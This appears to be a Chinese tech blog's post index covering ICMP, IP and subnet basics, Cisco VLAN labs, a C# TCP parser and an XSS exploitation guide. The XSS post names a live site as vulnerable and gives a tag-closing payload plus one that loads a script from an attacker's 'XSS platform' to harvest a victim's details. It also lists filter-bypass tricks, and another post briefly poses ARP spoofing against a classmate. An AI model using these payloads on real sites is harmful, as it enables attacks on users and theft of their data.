clientId,TcpServerProperties tcpServerProperties)    &#123;      var deviceStatus =\_deviceProvider.IsConnected(clientId);           this.Parser.HandlePayload().Subscribe(buffer=&gt;ParserBuffer(buffer));    &#125;    public override void DeviceStatusProcess(DeviceStatus status, string clientId, TcpServerProperties tcpServerProperties)    &#123;        //throw new NotImplementedException();    &#125;    public async Task ParserBuffer(IByteBuffer buffer)    &#123;        List&lt;string\&gt; result = new List&lt;string\&gt;();        while (buffer.ReadableBytes &gt; 0)        &#123;            result.Add(buffer.ReadString(this.Parser.GetNextFixedRecordLength(),                Encoding.GetEncoding(&quot;gb2312&quot;)));        &#125;        // var str= buffer.ReadString(buffer.ReadableBytes, Encoding.UTF8);                var byteBuffer=  Unpooled.Buffer();        byteBuffer.WriteString(&quot;\\r\\n&quot;, Encoding.UTF8);         byteBuffer.WriteString(&quot;处理完成&quot;, Encoding.GetEncoding(&quot;gb2312&quot;));        await Sender.SendAndFlushAsync(byteBuffer);        buffer.Release();        //  await Sender.SendAndFlushAsync(&quot;消息已接收&quot;,Encoding.GetEncoding(&quot;gb2312&quot;));        this.Parser.Close();     &#125;&#125;</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="**测试"></a>**测试</h2><p>**</p><p>规则引擎脚本解码测试</p><p><img src="https://static.luozhinet.com/14/354920c4595772ee720278e9885fe3"></p><p> direct 解码测试</p><p><img src="https://static.luozhinet.com/2a/81bde888c91f9e9a8b980add43457b"></p><h2 id="总结"><a href="#总结" class="headerlink" title="****总结"></a>****总结</h2><hr><p>最近忙着对于rtsp 进行bug 的修复和测试， 这样流媒体业务场景除了httpflv,rtmp 协议外，也能针对于rtsp协议的支持，协议之间互相也能进行转发， 对于rtsp 完成后，surging 将转继续优化构建平台化，年底也会陆续推出后台系统，基于Node-Red 可视化数据流的服务规则引擎编排。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> tcp </tag>
            
            <tag> 后台 </tag>
            
            <tag> 代码 </tag>
            
            <tag> buffer </tag>
            
            <tag> parser </tag>
            
            <tag> var </tag>
            
            <tag> encoding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ICMP</title>
      <link href="/posts/4ed96bc2df78/"/>
      <url>/posts/4ed96bc2df78/</url>
      
        <content type="html"><![CDATA[<p>ICMP</p><ul><li>ICMP用来传递差错控制，查询等信息。</li><li>ICMP Echo消息常用于诊断源和目的之间的网络连通性，同时还可以提供其他信息，如报文往返时间等。</li><li>当网络设备无法保证访问目标网络时，会自动发送ICMP目的不可达报文到发送端设备</li><li>type表示ICMP消息类型，code表示同一消息类型中的不同信息。</li></ul><p>　　<img src="https://static.luozhinet.com/67/976a2029ff1e1f5a8cc64efdb59dac"></p><ul><li> ICMP的一个典型应用是ping。ping是检测网络连通性的常用工具，同时也能够收集其他相关信息。用户可以在ping命令中指定不同参数，如ICMP报文长度、发送ICMP报文个数、等待回复响应的超时时间等，设备根据配置的参数来构造并发送ICMP报文，进行ping测试。</li><li>ping常用的配置参数说明如下：</li><li>1、-a source-ip-address指定发送icmp ECHO-REQUEST报文的源IP地址。如果不指定源IP地址，将采用出接口的IP地址作为ICMP echo-request报文发送的源地址。</li><li>2、-c count指定发送ICMP echo-request报文次数。缺省情况下发送5个ICMP echo-request报文。</li><li>3、-h ttl-value 指定的值。缺省值是255</li><li>4、-t timeout指定发送完ICMP echo-request后，等待ICMP echo-replay的超时时间。</li></ul><p>Tracert</p><p>ICMP的另一个典型应用是Tracert。Tracert基于报文头中的ttl值来逐跳跟踪报文的转发路径。为了跟踪到达某特定目的地地址的路径，源端首先将报文的ttl值设置为1.该报文到达第一个节点后，TTL超时，于是该节点向源端发送TTL超时消息，消息中携带时间戳。然后源端将报文的ttl值设置为2，报文到达第二个节点后超时，该节点同样返回TTL超时信息，以此类推，直到报文到达目的地。这样，源端根据返回的报文中的信息可以跟踪到报文经过的每一个节点，并根据时间戳信息计算往返时间。Tracert是检测网络丢包及时延的有效手段，同时可以帮助管理员发现网络中的路由环路。</p><ul><li>Tracert常用的配置参数说明如下<img src="https://static.luozhinet.com/40/7b7d56ff5426b54532b3b7d19c8c85"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 长度 </tag>
            
            <tag> 网络 </tag>
            
            <tag> 地址 </tag>
            
            <tag> 发送 </tag>
            
            <tag> ping </tag>
            
            <tag> 个数 </tag>
            
            <tag> icmp </tag>
            
            <tag> ttl </tag>
            
            <tag> tracert </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP地址、子网掩码、网关、DNS的介绍</title>
      <link href="/posts/ee26c38570a0/"/>
      <url>/posts/ee26c38570a0/</url>
      
        <content type="html"><![CDATA[<h1 id="IP地址、子网掩码、网关、DNS的介绍"><a href="#IP地址、子网掩码、网关、DNS的介绍" class="headerlink" title="IP地址、子网掩码、网关、DNS的介绍"></a>IP地址、子网掩码、网关、DNS的介绍</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li><code>客户端</code>：应用 <code>C/S</code>（客户端&#x2F;服务器） <code>B/S</code>（浏览器&#x2F;服务器）;</li><li><code>服务器</code>：客户端提供服务、数据、资源的机器;</li><li><code>请求</code>：客户端向服务器索取数据;</li><li><code>响应</code>：服务器对客户端请求作出反应，一般是返回给客户端数据;</li><li><code>URL</code>：统一资源定位符（Uniform Resource Locator）, 网络中每一个资源都对应唯一的地址——URL;</li><li><code>MAC地址</code>：MAC（Media Access Control，介质访问控制）地址，又称物理地址, 如同我们身份证上的身份证号码，具有全球唯一性;</li><li><code>IP</code>：网络互连协议（Internet Protocol），是TCP&#x2F;IP体系中的网络层协议;</li><li><code>子网掩码</code>：子网掩码(subnet mask)又叫网络掩码、地址掩码、子网络遮罩;</li><li><code>网关</code>：网关(Gateway)又称网间连接器、协议转换器。网关在传输层上以实现网络互连，是最复杂的网络互连设备，仅用于两个高层协议不同的网络互连;</li><li><code>DNS</code>：域名系统(Domain Name System)，为Internet上的主机分配域名地址的IP地址;</li><li><code>DHCP</code>：由服务器控制一段IP地址范围，客户机登录服务器时就可以自动获得服务器分配的IP地址和子网掩码。提升地址的使用率;</li></ul><h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><blockquote><p>IP（网络之间互连的协议）它是能使连接到网上的所有计算机网络实现相互通信的一套规则，规定了计算机在因特网上进行通信时应当遵守的规则。任何厂家生产的计算机系统，只要遵守IP协议就可以与因特网互连互通。IP地址有唯一性，即每台机器的IP地址在全世界是唯一的。这里指的是网络上的真实IP它是通过本机IP地址和子网掩码的”与”运算然后再通过各种处理算出来的；</p></blockquote><ul><li>tcp&#x2F;ip协议</li></ul><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;网际协议），也叫作网络通讯协议，是指能够在多个不同网络间实现信息传输的协议簇。TCP&#x2F;IP协议不仅仅指的是TCP 和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇， 只是因为在TCP&#x2F;IP协议中TCP协议和IP协议最具代表性，所以被称为TCP&#x2F;IP协议。</p><ul><li>所谓IP地址就是给每个连接在Internet上的主机分配的一个32bit地址。按照TCP&#x2F;IP协议规定，IP地址用二进制来表示，每个IP地址长32bit，比特换算成字节，就是4个字节。例如一个采用二进制形式的IP地址是“00001010000000000000000000000001”，这么长的地址，人们处理起来也太费劲了。为了方便人们的使用，IP地址经常被写成十进制的形式，中间使用符号“.”分开不同的字节。于是，上面的IP地址可以表示为“10.0.0.1”。IP地址的这种表示法叫做“点分十进制表示法”，这显然比1和0容易记忆得多。</li></ul><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><blockquote><p>互联网是由许多小型网络构成的，每个网络上都有许多主机，这样便构成了一个有层次的结构。IP地址在设计时就考虑到地址分配的层次特点，将每个IP地址都分割成网络号和主机号两部分，以便于IP地址的寻址操作;  </p><p>子网掩码(subnet mask)又叫网络掩码、地址掩码、子网络遮罩；子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分；子网掩码不能单独存在，它必须结合IP地址一起使用。</p></blockquote><ul><li>常用子网掩码</li></ul><ol><li>子网掩码“255.255.255.0”的网络：<ol><li>最后面一个数字可以在0~255范围内任意变化，因此可以提供256个IP地址。但是实际可用的IP地址数量是256-2，即254个，因为主机号不能全是“0”或全是“1”。</li></ol></li><li>子网掩码“255.255.0.0”的网络：<ol><li>后面两个数字可以在0~255范围内任意变化，可以提供256²个IP地址。但是实际可用的IP地址数量是256²-2，即65534个。</li></ol></li></ol><p>Tips:</p><ol><li>IP地址的子网掩码设置不是任意的，应该根据网络的规模进行设置;</li><li>如果将子网掩码设置过大，也就是说子网范围扩大，那么，根据子网寻径规则，很可能发往和本地主机不在同一子网内的目标主机的数据，会因为错误的判断而认为目标主机是在同一子网内，导致数据包将在本子网内循环，直到超时并抛弃，使数据不能正确到达目标主机，导致网络传输错误；</li><li>如果将子网掩码设置得过小，那么就会将本来属于同一子网内的机器之间的通信当做是跨子网传输，数据包都交给缺省网关处理，这样势必增加缺省网关的负担，造成网络效率下降;</li></ol><h2 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h2><blockquote><p>网关(Gateway)又称网间连接器、协议转换器。网关在传输层上以实现网络互连，是最复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。 网关是一种充当转换重任的计算机系统或设备。在使用不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同时，网关也可以提供过滤和安全功能。</p></blockquote><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><ul><li>DNS服务器</li></ul><blockquote><p>域名服务器(Domain Name Server)。在Internet上域名与IP地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，DNS就是进行域名解析的服务器;</p></blockquote><p>国内DNS推荐： <code>114.114.114.114</code> &#x2F; <code>114.114.114.115</code></p><p>更多DNS参考： <a href="https://blog.csdn.net/qq_14989227/article/details/78342237">https://blog.csdn.net/qq_14989227&#x2F;article&#x2F;details&#x2F;78342237</a></p><h2 id="IP与子网掩码换算"><a href="#IP与子网掩码换算" class="headerlink" title="IP与子网掩码换算"></a>IP与子网掩码换算</h2><ol><li>case 1<ul><li><p>如果要使这三个ip段在同一个网段内，那么这个大网段共同的子网掩码是多少呢？</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip段一：192.168.0.1——192.168.0.254</span><br><span class="line"></span><br><span class="line">ip段二：192.168.1.1——192.168.1.254</span><br><span class="line"></span><br><span class="line">ip段三：192.168.2.1——192.168.2.254</span><br></pre></td></tr></table></figure></li><li><p>我们来分析下：</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 将ip地址192.168.0.1转换为二进制</span></span><br><span class="line">11000000 10101000 00000000 0000000</span><br><span class="line"></span><br><span class="line"><span class="section"># 将ip地址192.168.1.1转换为二进制</span></span><br><span class="line">11000000 10101000 00000001 00000001</span><br><span class="line"></span><br><span class="line"><span class="section"># 将ip地址192.168.2.1转换为二进制</span></span><br><span class="line">11000000 10101000 00000010 00000001</span><br><span class="line"></span><br><span class="line">转换成了二进制，可以看得出，三个ip段的二进制前面 <span class="code">`22`</span> 位的是不变的，那么可以将他们表示成：</span><br><span class="line"></span><br><span class="line">ip段一：192.168.0.1/22</span><br><span class="line">ip段二：192.168.1.1/22</span><br><span class="line">ip段三：192.168.2.1/22</span><br><span class="line"></span><br><span class="line">这种192.168.2.x/22形式的ip地址相信大家平时都见过，就是已经告诉了子网掩码了。</span><br><span class="line">也就是说他们共同的子网掩码二进制前面22个都是1。</span><br><span class="line"></span><br><span class="line">11111111 11111111 11111100 00000000</span><br></pre></td></tr></table></figure></li></ul></li></ol><p>　　- 结果<br>转换成十进制，那就是255.255.252.0，所以他们共同的子网掩码就是<code>255.255.252.0</code>。</p><p>Reference</p><ul><li><a href="https://zhuanlan.zhihu.com/p/65226634">https://zhuanlan.zhihu.com/p/65226634</a></li><li><a href="https://blog.csdn.net/weixin_39676242/article/details/110257459">https://blog.csdn.net/weixin_39676242&#x2F;article&#x2F;details&#x2F;110257459</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
            <tag> 格式 </tag>
            
            <tag> 网络 </tag>
            
            <tag> 地址 </tag>
            
            <tag> 处理 </tag>
            
            <tag> 资源 </tag>
            
            <tag> 转换 </tag>
            
            <tag> 使用 </tag>
            
            <tag> 分配 </tag>
            
            <tag> 子网掩码 </tag>
            
            <tag> 互连 </tag>
            
            <tag> tcp </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞利用方式总结</title>
      <link href="/posts/9c7ef4c2219b/"/>
      <url>/posts/9c7ef4c2219b/</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>最近一直在挖漏洞，碰到的XSS漏洞最多了，今天就顺便来讲一下，如有错的地方，烦请指出。  </p><p>00×1    什么是XSS漏洞：  </p><p>     XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。 ​  </p><p>00×2    XSS漏洞有什么危害：  </p><p>     1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号  </p><p>     2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力  </p><p>     3、盗窃企业重要的具有商业价值的资料  </p><p>     4、非法转账  </p><p>     5、强制发送电子邮件  </p><p>     6、网站挂马  </p><p>     7、控制受害者机器向其它网站发起攻击  </p><p>​ ​  </p><p>00×3    XSS的分类：  </p><p>     1，反射型：  </p><p>     定义：非持久型、参数型  </p><p>     出现位置：网站搜索栏、用户登入口位置  </p><p>     2，存储型  </p><p>     定义：持久型  </p><p>     出现位置：网站留言、评论、博客日志等交互处  </p><p>     3，DOM型  </p><p>00×4    XSS漏洞的挖掘：  </p><p>     如何去挖掘XSS呢？手工+工具+思路+勤奋的双手&#x3D;漏洞  </p><p>     手工：自己构造payload，见框就插  </p><p>     工具：safe3，AWVS，Burpsuite丶Appscan丶XssSniper浏览器插件丶cookie修改工具  </p><p>     思路：个人信息，留言板，评论等，注意观察url变化，也可能会出现其他漏洞，如：逻辑漏洞  </p><p>     勤奋：不要总以为自己看一遍就会了，多去实战才能积累经验  </p><p>     漏洞：当你看到别人挖到了这个网站的漏洞，你就不挖了，他可能只是过滤了一个字符呢？漏洞无处不在，思路很重要  </p><p>​  </p><p>00×5    XSS绕过方法总结：  </p><p>     1，绕过单引号<br>     2，绕过 SCRIPT 过滤<br>     3，使用 IMG 源<br>     4，使用制表符 换行符和回车符<br>     5，使用空白符<br>     6，双引号配对的 bug<br>     7，绕过css过滤器<br>     8，不全面的过滤器<br>     9，转义字符<br>     10，编码  </p><p>00×6    XSS的简单闭合案例：  </p><p>     我已经找到了一个反射型的XSS，我就不打码了  </p><p>      域名：<a href="http://so.kuge.cc/">http://so.kuge.cc/</a>  </p><p>     是酷鸽网的一个分站，首先我们插入正常的XSS代码    <script>alert('XSS')</script>  </p><p>     查看源代码，我们发现他已经插入到html代码中，但是没弹框，不要放弃，我们接着看  </p><p>       </p><p>   </p><p>     我们发现<a href="https://www.cnblogs.com/XunanSec/p/?op=news&k=<script>alert('XSS')</script> " class="a">新闻</a>  </p><p>  重点在&lt;a标签，我们发现前面一个&lt;a到后面”&gt;结束这一小部分  </p><p>  我们开始构造payload，闭合<a>标签 payload：”&gt;<script>alert('XSS')</script>&lt;a  </p><p>成功弹窗  </p><p>​  </p><p>00×7    利用XSS获取目标IP：  </p><p>     首先你要找到一个存在XSS漏洞的站，反射型XSS也好，储存型XSS也好，DOM型的也一样  </p><p>     还是刚才那个，域名：<a href="http://so.kuge.cc/">http://so.kuge.cc/</a>  </p><p>     构造payload：  </p><p>     <a href="http://so.kuge.cc/search.phpk=&quot;&gt;">http://so.kuge.cc/search.phpk=&quot;&gt;</a><script src=你的XSS平台></script>&lt;a  </p><p>  可以缩短发给目标，目标打开后，接收目标信息  </p><p>00×8   新手在寻找XSS时所存在的一些误区：  </p><p>     1，误区1：XSS，不是专门去“绕过”限制。  </p><p>     打个简单的比方，一个已经被层层把守的大门，面前荆棘无数，而你又单枪匹马的，怎么闯的进去？ 这个时候你要意识到，走大门是不可能的。其实我们要突破的城防，有很多小门可以进去的，甚至不需要任何手段就可以直接走进去。我们为什么不走呢？  </p><p>     XSS是很好防御的，不就是过滤一下么，所以我们不要太多寄希望与程序员错误的过滤逻辑，而应该把希望寄托于程序员的“忘记过滤”上。  </p><p>     2，误区2： XSS，不仅仅存在于你所看得见的位置。  </p><p>大部分新手，在寻找XSS时，都会在一些评论框去输入XSS代码，然后看页面有没有弹窗。当然不是说这个方法没有用，而是这种方法，几乎很难“碰”到一个XSS。所以很多新手会觉得XSS怎么这么难找到。原因有几点：A）：像评论框，个人资料这种，你所能想到的位置。稍微有一点安全意识的程序员也能想到，所以经常是被过滤掉的。<br>B）：你所填入的资料，并不总是以HTML标签的形式，输出到页面上。所以有时候并不是不能X，只是因为你填入的东西不对。  </p><p>看不见有两个层面：  </p><p>A） 输入看不见。  </p><p>建议大家在提交请求的时候，使用抓包软件，然后对请求的参数逐个测试。  </p><p>B)  输出看不见。  </p><p>建议大家对返回的数据，也可以使用抓包软件抓取数据，然后对抓回的数据进行搜索，搜索你输入的数据，来定位看不见的输出。  </p><p>3，误区3： XSS，绕过限制不是让你乱用字符去绕过，切忌盲目。<br>     某人在看到代码是 <a href="https://www.cnblogs.com/XunanSec/p/xxxx\\u0022"> 的时候，问大家：“为什么\u0022”不行啊？ 这种绕过是盲目的。  </p><p>     在测试初期，我们如果不愿意去看对方的代码逻辑，可以采用“盲目”的方式去测试（用各种特殊字符去试探），这样可以节省很多时间。但是，当我们已经能够确定，数据输出位于哪个点时，比如上面这个<br>xxxx ，我们已经知道是输出到了 href&#x3D;”https://www.cnblogs.com/XunanSec/p/之间"  的时候。我们就不能盲目的去"绕过”，一定要有针对性。这个针对性主要是以下几点。  </p><p>A) 输出点，是直接输出，还是经过了DOM。  </p><p>  简单通俗点的说法是：<br>  前者可以通过右键查看源代码，搜索到。<br>  后者通过右键查看源代码是搜索不到的。  </p><p>B) 直接输出点，是位于HTML标签里，还是位于Script脚本里，或者是Style里  </p><p>  HTML标签又分为：<br>    是在HTML标签之间： <div> 内容在这里 </div><br>    还是在HTML属性之间： <img alt="内容在这里"><br>    还是在HTML事件之间:  <img><br>  Script&#x2F;style标签：<br>    根据输出自己去构造闭合，保证语法正确即可。  </p><p>C)  DOM输出点，这个需要一定的JS基础。<br>  C.1) 定位输出内容的JS代码段。<br>  C.2) 查看此代码段，是否存在过滤问题。<br>  C.3) 如果存在，制定绕过规则。  </p><p>D) 输出点，采用的什么过滤规则<br>  D.1)了解以上B)中，<br>    每个点该过滤什么字符，<br>    如果没过滤什么字符，该怎么去利用。<br>  D.2)逐个测试法，看看目标输出点，到底过滤了哪些字符<br>  D.3)测试服务器端的一些转换逻辑，比如有些服务器会先将&quot;转换为”<br>  D.4)确定是否可绕过，不能绕过的尽早放弃  </p><p>     总之，首先要了解如何防御，你才能了解，如何绕过，不能盲目。其中，B+D的规则基本是死的，偶尔碰上些服务器端过滤逻辑有问题的，是可以绕过的，尤其是服务器端采用黑名单的方式时。C则较为灵活，所谓的“绕过”往往是针对这种。​  </p><p>4，其它：  </p><p>A) 代码里明明看到插入了 <script>，怎么不执行啊？  </p><p>这种问题，zone里貌似有几个帖子了，这里强调下，打开调试工具看代码的时候，请注意颜色。<br>以chrome为例，只有<script>..</script>标记以彩色显示时，才说明是插入了，而以黑色显示时，实际上的代码是：&lt;script&gt;….<br>&lt;&#x2F;script&gt; ，其它标签同理。  </p><p>B) <xxx xxxx="xxx"> 这个放进去怎么不行啊？  </p><p>首先确定你这个是XSS代码，此外，一些新手会在网上找到一些旧的资料，而有些XSS代码是IE6时代的产物，或者是浏览器特异的代码，所以一定要注意代码来源，适用于什么浏览器。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> xss </tag>
            
            <tag> 代码 </tag>
            
            <tag> 帐号 </tag>
            
            <tag> 持久型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全球IP归属</title>
      <link href="/posts/a84c927bae36/"/>
      <url>/posts/a84c927bae36/</url>
      
        <content type="html"><![CDATA[<p>很有个性的IP，很可惜，中国没有！</p><blockquote><p>– 1.1.1.1 APNIC（澳大利亚）</p><p>– 2.2.2.2 法国电信</p><p>– 3.3.3.3 通用电器</p><p>– 4.4.4.4 Level3(美国服务商)</p><p>– 5.5.5.5 德国电信</p><p>– 6.6.6.6 美国陆军</p><p>– 7.7.7.7 美国国防部</p><p>– 8.8.8.8 谷歌</p><p>– 9.9.9.9 IBM</p></blockquote><p>普及点知识：</p><p><img src="https://static.luozhinet.com/be/3da5c2a82a8f8f57a0708186fa3b47"></p><h3 id="你看看这些公司数据，地址块啊！"><a href="#你看看这些公司数据，地址块啊！" class="headerlink" title="你看看这些公司数据，地址块啊！"></a>你看看这些公司数据，地址块啊！</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://static.luozhinet.com/52/0011821e84b0ce4396f95da415b523"></h3><p>美国特殊数据</p><p><img src="https://static.luozhinet.com/9a/3789ef87f414ca840412f306203021"></p><p>列举这些，每个公司或者机构都分配了巨量的IP，数量为16777216（一千六百多万个IP）</p><p><em>中国这些地址块都没分到，只有一些零碎的。但数量远不如美国啊，人均更不用说了！</em></p><h3 id="看看这些部分各国的IP数据！"><a href="#看看这些部分各国的IP数据！" class="headerlink" title="看看这些部分各国的IP数据！"></a>看看这些部分各国的IP数据！</h3><p><img src="https://static.luozhinet.com/5a/2d4276c5bc138cb4711675abb2e272"></p><p>中国IP分配：<img src="https://static.luozhinet.com/e0/2e1f641452d03403c154b4972793fa"></p><p>知道现在装宽带没什么没公网IP了吧，早就用完了，现在运营商NAT分配，全面进入内网了，你懂得！哈哈哈！！！</p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 地址 </tag>
            
            <tag> 分配 </tag>
            
            <tag> 4.4.4.4 </tag>
            
            <tag> 9.9.9.9 </tag>
            
            <tag> 7.7.7.7 </tag>
            
            <tag> 6.6.6.6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基本认识（一）</title>
      <link href="/posts/094c628b48a6/"/>
      <url>/posts/094c628b48a6/</url>
      
        <content type="html"><![CDATA[<p>网络中存在2个地址<br>IP、MAC<br>谁是互联网的主要地址呢？ IP</p><p>为什么不是MAC地址呢？</p><p>根据OSI七层模型，交换机是工作在数据链路层，主要基于MAC地址转发，比较安全。通俗来讲MAC地址在以太网通过交换机进行通信，也就是MAC地址主要在局域网中传输。</p><p>路由器是工作在网络层，也就是IP层。国际互联网主要是路由器来做交换的，IP地址是基于路由器转发的 。路由器系统构成了基于TCP&#x2F;IP 的国际互联网络Internet 的主体脉络，也可以说，路由器构成了Internet的骨架。</p><p>1 .实验：使用ipconfig命令查看自己的ip地址<br>使用ping命令去ping对方，查看结果<br>2 .疑问：我们的通信发生在以太网内部的，两台主机之间的设备<br>也是交换机，交换机基于MAC地址转发数据包<br>为什么使用ping命令，ping对方的ip地址能够ping通呢？<br>3. 分析：如果数据包携带的是目的地的ip地址，到达交换机以后<br>交换机只有一个字：滚，看来不可能是只写了ip地址的<br>必然是同时写了mac地址的<br>4 .结论： pcA去试图和pcB进行访问的时候，实现知道了pcB的ip地址<br>以后，使用ARP协议（地址解析协议），去广播询问pcB的MAC地址<br>主机B受到询问以后，进行回答，主机A获取到主机B的MAC地址<br>以太网通信的时候，知道了目的地的ip地址以后，必须通过ARP协议<br>解析到目的地的MAC地址，只有知晓了目的地的MAC地址以后，才能<br>经过交换机进行通信<br>ARP分为一问一答<br>192.168.1.1   192.168.1.2<br>who has 192.168.1.2 tell 192.168.1.1 广播包，所有人都会收到<br>192.168.1.2 is at 9A-3F-4B-21-67-1C<br>5 .引申 如何基于ARP实现一种黑客攻击，让你的同桌掉线？<br>如何使用ARP协议实现中间人攻击，从而获取到你同桌的账号密码呢？<br>6 .防御 从网络工程师的角度上，如何防御以太网中的大量广播，以及ARP攻击问题呢？最基本的办法就是划分VLAN<br>7 .实验流程以及相应命令<br>a .百度 下载cisco packet tracer 6.2<br>b .拖拽一台交换机 cisco2960系列交换机，两台电脑连接到交换机上<br>c. 分别配置两台电脑的ip地址为192.168.1.1 和192.168.1.2<br>d. 使用ping命令去ping192.168.1.2 观察ping结果<br>使用ping -t 192.168.1.2 再次观察不同<br>e. 在交换机上使用命令<br>Switch&gt;enable &#x2F;&#x2F;进入特权模式<br>Swith#configure terminal &#x2F;&#x2F;进入到全局模式<br>Switch(config)#vlan 10 &#x2F;&#x2F;创建一个vlan10<br>switch(config)#vlan 20 &#x2F;&#x2F;创建一个vlan20<br>Switch(config)#interface fa0&#x2F;1 &#x2F;&#x2F;进入到交换机连接到pc1的接口<br>switch(config-if)#switchport mode access<br>switch(config-if)#switchport access vlan 10 &#x2F;&#x2F;把接口划分到vlan10中<br>Switch(config)#interface fa0&#x2F;2 &#x2F;&#x2F;进入到交换机连接到pc2的接口<br>switch(config-if)#switchport mode access<br>switch(config-if)#switchport access vlan 20 &#x2F;&#x2F;把接口划分到vlan10中<br>f .再次观察两台主机是否能够ping通</p><p>扩展，如果再加一个交换机呢？又怎么样划分VLAN？怎样PC0单独和PC2进行通信？</p><p><img src="https://static.luozhinet.com/5c/a6f33f509f611f9003d59ae2588de2"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 地址 </tag>
            
            <tag> ping </tag>
            
            <tag> 百度 </tag>
            
            <tag> 交换机 </tag>
            
            <tag> mac </tag>
            
            <tag> switch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基本认识，思科模拟器基础实验（二）</title>
      <link href="/posts/7d24a875713f/"/>
      <url>/posts/7d24a875713f/</url>
      
        <content type="html"><![CDATA[<p>跨越不同交换机的相同VLAN互通实验</p><p><img src="https://static.luozhinet.com/24/ee48819e32d252ef8b65d3af5b8bfd"></p><p>如图所示，把两台交换机连接的pc，分别划分进入到vlan10和vlan20中，实验目的为vlan10的主机可以跨越交换机实现通信，vlan20的主机可以跨越交换机实现通信，vlan10和vlan20的主机彼此之间无法通信，基本配置和实验1类似，正常在交换机上划分vlan和把接口划分进入到vlan中，需要注意的是交换机之间的链路需要配置成trunk，配置trunk的命令如下</p><p>Interface f0&#x2F;3</p><p>Switchport mode trunk</p><p>当把交换机之间的链路配置成为trunk以后，trunk链路允许多个vlan的流量通过</p><p>所以VLAN10和vlan20的流量都可以在trunk链路上传输</p><p>在传输的过程中，vlan的流量会打上标记，所以到了另外一侧交换机，交换机可以根据数据包中的标记来确定流量来自于哪一个vlan</p><p>通过前两个实验，可以得到结论：只有一个vlan可以通过的接口为access接口，可以有多个vlan同时通过的接口为trunk接口</p><p>配置命令总结</p><p>Switchport mode access</p><p>Switchport access vlan xxx</p><p>Switchport mode trunk</p><p>单臂路由实验</p><p><img src="https://static.luozhinet.com/78/84d0a436904b275dc60bf0e4c7dfe5"></p><p>在前面的实验中，我们可以得到结论：在交换机连接PC的局域网里，相同VLAN可以通信，不同VLAN不能进行通信，那么实际工作中是怎样的呢？</p><p>在实际工作中，我们确实会对不同vlan的流量进行隔离，例如vlan10无法直接访问vlan20，但是更多的情况下，不同vlan的流量还是可以进行三层通信的。</p><p>例如，我们和百度可以进行三层通信，我们可以ping的通百度，但是我们无法发送广播包到百度，我们也无法ARP欺骗攻击到百度，这就是区别。所以我们认为三层的通信是安全的，2层的直接通信是危险的</p><p>那么如何实现不同vlan的互相访问呢？这个时候就需要使用路由器作为3层中转了</p><p>配置过程如下，交换机下联PC的接口作为access接口并分别划分进入到vlan10和vlan20</p><p>交换机配置</p><p>Vlan10</p><p>Vlan 20</p><p>Interface f0&#x2F;1</p><p>Switchport mode access</p><p>Switchport access vlan 10</p><p>Interface f0&#x2F;2</p><p>Switchport mode access</p><p>Switchport access vlan 20</p><p>Interface f0&#x2F;3   &#x2F;&#x2F;进入到交换机上联路由器的接口</p><p>Switchport mode trunk  